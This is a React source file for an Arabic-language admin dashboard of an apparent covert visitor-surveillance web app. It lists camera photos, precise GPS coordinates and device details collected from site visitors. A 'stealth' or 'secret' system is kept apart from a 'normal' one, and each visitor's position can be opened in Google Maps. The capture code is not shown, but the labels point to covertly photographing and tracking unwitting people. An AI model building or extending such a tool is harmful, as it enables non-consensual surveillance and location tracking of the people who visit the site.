import React, { useState, useEffect } from 'react';
import { useCamera } from '@/hooks/useCamera';
import { useStealthCamera } from '@/hooks/useStealthCamera';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Trash2, Eye, MapPin, Camera, Calendar, Monitor, Shield } from 'lucide-react';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from '@/components/ui/dialog';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';

interface VisitorData {
  id: string;
  photos: Array<{
    id: string;
    dataUrl: string;
    timestamp: Date;
  }>;
  location: {
    latitude: number;
    longitude: number;
    accuracy: number;
    timestamp: Date;
  } | null;
  visitTime: Date;
  userAgent: string;
}

const AdminPage: React.FC = () => {
  const { getAllVisitors: getNormalVisitors, clearAllData: clearNormalData } = useCamera();
  const { getAllVisitors: getStealthVisitors, clearAllData: clearStealthData } = useStealthCamera();
  
  const [normalVisitors, setNormalVisitors] = useState<VisitorData[]>([]);
  const [stealthVisitors, setStealthVisitors] = useState<VisitorData[]>([]);
  const [selectedVisitor, setSelectedVisitor] = useState<VisitorData | null>(null);
  const [activeTab, setActiveTab] = useState('stealth');

  useEffect(() => {
    loadAllVisitors();
  }, []);

  const loadAllVisitors = () => {
    const normalData = getNormalVisitors();
    const stealthData = getStealthVisitors();
    setNormalVisitors(normalData);
    setStealthVisitors(stealthData);
  };

  const handleClearNormalData = () => {
    if (confirm('هل أنت متأكد من حذف جميع بيانات النظام العادي؟')) {
      clearNormalData();
      setNormalVisitors([]);
    }
  };

  const handleClearStealthData = () => {
    if (confirm('هل أنت متأكد من حذف جميع بيانات النظام السري؟')) {
      clearStealthData();
      setStealthVisitors([]);
    }
  };

  const handleClearAllData = () => {
    if (confirm('هل أنت متأكد من حذف جميع البيانات (العادية والسرية)؟')) {
      clearNormalData();
      clearStealthData();
      setNormalVisitors([]);
      setStealthVisitors([]);
    }
  };

  const formatDate = (date: Date | string) => {
    const d = new Date(date);
    return d.toLocaleString('ar-EG');
  };

  const getBrowserInfo = (userAgent: string) => {
    if (userAgent.includes('Chrome')) return 'Chrome';
    if (userAgent.includes('Firefox')) return 'Firefox';
    if (userAgent.includes('Safari')) return 'Safari';
    if (userAgent.includes('Edge')) return 'Edge';
    return 'Unknown';
  };

  const getDeviceInfo = (userAgent: string) => {
    if (userAgent.includes('Mobile')) return 'موبايل';
    if (userAgent.includes('Tablet')) return 'تابلت';
    return 'كمبيوتر';
  };

  const renderVisitorsList = (visitors: VisitorData[], isStealthMode: boolean = false) => (
    <div className="grid gap-4">
      {visitors.map((visitor) => (
        <Card key={visitor.id} className="hover:shadow-md transition-shadow">
          <CardContent className="p-6">
            <div className="flex justify-between items-start mb-4">
              <div className="flex-1">
                <div className="flex items-center gap-2 mb-2">
                  {isStealthMode && <Shield className="w-4 h-4 text-red-500" />}
                  <Calendar className="w-4 h-4 text-gray-500" />
                  <span className="text-sm text-gray-600">
                    {formatDate(visitor.visitTime)}
                  </span>
                  {isStealthMode && (
                    <Badge variant="destructive" className="text-xs">
                      سري
                    </Badge>
                  )}
                </div>
                
                <div className="flex items-center gap-2 mb-2">
                  <Monitor className="w-4 h-4 text-gray-500" />
                  <span className="text-sm text-gray-600">
                    {getBrowserInfo(visitor.userAgent)} - {getDeviceInfo(visitor.userAgent)}
                  </span>
                </div>

                {visitor.location && (
                  <div className="flex items-center gap-2 mb-2">
                    <MapPin className="w-4 h-4 text-gray-500" />
                    <span className="text-sm text-gray-600">
                      {visitor.location.latitude.toFixed(6)}, {visitor.location.longitude.toFixed(6)}
                      <Badge variant="secondary" className="ml-2">
                        دقة: {visitor.location.accuracy.toFixed(0)}م
                      </Badge>
                    </span>
                  </div>
                )}

                <div className="flex items-center gap-2">
                  <Camera className="w-4 h-4 text-gray-500" />
                  <span className="text-sm text-gray-600">
                    {visitor.photos.length} صورة
                  </span>
                </div>
              </div>

              <div className="flex gap-2">
                <Dialog>
                  <DialogTrigger asChild>
                    <Button 
                      variant="outline" 
                      size="sm"
                      onClick={() => setSelectedVisitor(visitor)}
                    >
                      <Eye className="w-4 h-4 mr-1" />
                      عرض الصور
                    </Button>
                  </DialogTrigger>
                  <DialogContent className="max-w-4xl max-h-[80vh] overflow-y-auto">
                    <DialogHeader>
                      <DialogTitle className="flex items-center gap-2">
                        {isStealthMode && <Shield className="w-5 h-5 text-red-500" />}
                        صور الزائر - {formatDate(visitor.visitTime)}
                        {isStealthMode && <Badge variant="destructive">سري</Badge>}
                      </DialogTitle>
                    </DialogHeader>
                    <div className="grid grid-cols-2 md:grid-cols-3 gap-4 mt-4">
                      {visitor.photos.map((photo, index) => (
                        <div key={photo.id} className="space-y-2">
                          <img
                            src={photo.dataUrl}
                            alt={`صورة ${index + 1}`}
                            className="w-full h-32 object-cover rounded border"
                          />
                          <p className="text-xs text-gray-500 text-center">
                            صورة {index + 1} - {formatDate(photo.timestamp)}
                          </p>
                        </div>
                      ))}
                    </div>
                  </DialogContent>
                </Dialog>

                {visitor.location && (
                  <Button 
                    variant="outline" 
                    size="sm"
                    onClick={() => {
                      const url = `https://www.google.com/maps?q=${visitor.location!.latitude},${visitor.location!.longitude}`;
                      window.open(url, '_blank');
                    }}
                  >
                    <MapPin className="w-4 h-4 mr-1" />
                    عرض الموقع
                  </Button>
                )}
              </div>
            </div>

            {/* Preview of first few photos */}
            <div className="flex gap-2 overflow-x-auto">
              {visitor.photos.slice(0, 5).map((photo, index) => (
                <img
                  key={photo.id}
                  src={photo.dataUrl}
                  alt={`معاينة ${index + 1}`}
                  className="w-16 h-16 object-cover rounded flex-shrink-0 border"
                />
              ))}
              {visitor.photos.length > 5 && (
                <div className="w-16 h-16 bg-gray-100 rounded border flex items-center justify-center flex-shrink-0">
                  <span className="text-xs text-gray-500">+{visitor.photos.length - 5}</span>
                </div>
              )}
            </div>
          </CardContent>
        </Card>
      ))}
    </div>
  );

  const getStatsForVisitors = (visitors: VisitorData[]) => ({
    total: visitors.length,
    totalPhotos: visitors.reduce((total, visitor) => total + visitor.photos.length, 0),
    today: visitors.filter(v => {
      const today = new Date();
      const visitDate = new Date(v.visitTime);
      return visitDate.toDateString() === today.toDateString();
    }).length
  });

  const normalStats = getStatsForVisitors(normalVisitors);
  const stealthStats = getStatsForVisitors(stealthVisitors);
  const totalStats = {
    total: normalStats.total + stealthStats.total,
    totalPhotos: normalStats.totalPhotos + stealthStats.totalPhotos,
    today: normalStats.today + stealthStats.today
  };

  return (
    <div className="min-h-screen bg-gray-50 p-4">
      <div className="max-w-6xl mx-auto">
        <div className="flex justify-between items-center mb-6">
          <h1 className="text-3xl font-bold text-gray-900">لوحة إدارة الزوار</h1>
          <div className="flex gap-2">
            <Button onClick={loadAllVisitors} variant="outline">
              تحديث البيانات
            </Button>
            <Button onClick={handleClearAllData} variant="destructive">
              حذف جميع البيانات
            </Button>
          </div>
        </div>

        {/* إحصائيات عامة */}
        <div className="grid gap-4 mb-6">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <Card>
              <CardHeader className="pb-2">
                <CardTitle className="text-sm font-medium">إجمالي الزوار</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="text-2xl font-bold">{totalStats.total}</div>
                <div className="text-xs text-gray-500 mt-1">
                  عادي: {normalStats.total} | سري: {stealthStats.total}
                </div>
              </CardContent>
            </Card>
            
            <Card>
              <CardHeader className="pb-2">
                <CardTitle className="text-sm font-medium">إجمالي الصور</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="text-2xl font-bold">{totalStats.totalPhotos}</div>
                <div className="text-xs text-gray-500 mt-1">
                  عادي: {normalStats.totalPhotos} | سري: {stealthStats.totalPhotos}
                </div>
              </CardContent>
            </Card>
            
            <Card>
              <CardHeader className="pb-2">
                <CardTitle className="text-sm font-medium">الزوار اليوم</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="text-2xl font-bold">{totalStats.today}</div>
                <div className="text-xs text-gray-500 mt-1">
                  عادي: {normalStats.today} | سري: {stealthStats.today}
                </div>
              </CardContent>
            </Card>
          </div>
        </div>

        {/* تبويبات البيانات */}
        <Tabs value={activeTab} onValueChange={setActiveTab}>
          <TabsList className="grid w-full grid-cols-3">
            <TabsTrigger value="stealth" className="flex items-center gap-2">
              <Shield className="w-4 h-4" />
              النظام السري ({stealthStats.total})
            </TabsTrigger>
            <TabsTrigger value="normal" className="flex items-center gap-2">
              <Camera className="w-4 h-4" />
              النظام العادي ({normalStats.total})
            </TabsTrigger>
            <TabsTrigger value="all" className="flex items-center gap-2">
              <Monitor className="w-4 h-4" />
              جميع البيانات ({totalStats.total})
            </TabsTrigger>
          </TabsList>
          
          <TabsContent value="stealth" className="mt-6">
            <div className="flex justify-between items-center mb-4">
              <h2 className="text-xl font-semibold flex items-center gap-2">
                <Shield className="w-5 h-5 text-red-500" />
                بيانات النظام السري
              </h2>
              <Button onClick={handleClearStealthData} variant="destructive" size="sm">
                حذف البيانات السرية
              </Button>
            </div>
            {stealthVisitors.length > 0 ? (
              renderVisitorsList(stealthVisitors, true)
            ) : (
              <div className="text-center py-12">
                <Shield className="w-16 h-16 text-gray-300 mx-auto mb-4" />
                <h3 className="text-lg font-medium text-gray-900 mb-2">لا توجد بيانات سرية</h3>
                <p className="text-gray-600">لم يتم تسجيل أي زوار في النظام السري بعد</p>
              </div>
            )}
          </TabsContent>
          
          <TabsContent value="normal" className="mt-6">
            <div className="flex justify-between items-center mb-4">
              <h2 className="text-xl font-semibold flex items-center gap-2">
                <Camera className="w-5 h-5 text-blue-500" />
                بيانات النظام العادي
              </h2>
              <Button onClick={handleClearNormalData} variant="destructive" size="sm">
                حذف البيانات العادية
              </Button>
            </div>
            {normalVisitors.length > 0 ? (
              renderVisitorsList(normalVisitors, false)
            ) : (
              <div className="text-center py-12">
                <Camera className="w-16 h-16 text-gray-300 mx-auto mb-4" />
                <h3 className="text-lg font-medium text-gray-900 mb-2">لا توجد بيانات عادية</h3>
                <p className="text-gray-600">لم يتم تسجيل أي زوار في النظام العادي بعد</p>
              </div>
            )}
          </TabsContent>
          
          <TabsContent value="all" className="mt-6">
            <div className="space-y-6">
              {stealthVisitors.length > 0 && (
                <div>
                  <h3 className="text-lg font-medium mb-4 flex items-center gap-2">
                    <Shield className="w-5 h-5 text-red-500" />
                    البيانات السرية
                  </h3>
                  {renderVisitorsList(stealthVisitors, true)}
                </div>
              )}
              
              {normalVisitors.length > 0 && (
                <div>
                  <h3 className="text-lg font-medium mb-4 flex items-center gap-2">
                    <Camera className="w-5 h-5 text-blue-500" />
                    البيانات العادية
                  </h3>
                  {renderVisitorsList(normalVisitors, false)}
                </div>
              )}
              
              {stealthVisitors.length === 0 && normalVisitors.length === 0 && (
                <div className="text-center py-12">
                  <Monitor className="w-16 h-16 text-gray-300 mx-auto mb-4" />
                  <h3 className="text-lg font-medium text-gray-900 mb-2">لا توجد بيانات</h3>
                  <p className="text-gray-600">لم يتم تسجيل أي زوار بعد</p>
                </div>
              )}
            </div>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
};

export default AdminPage;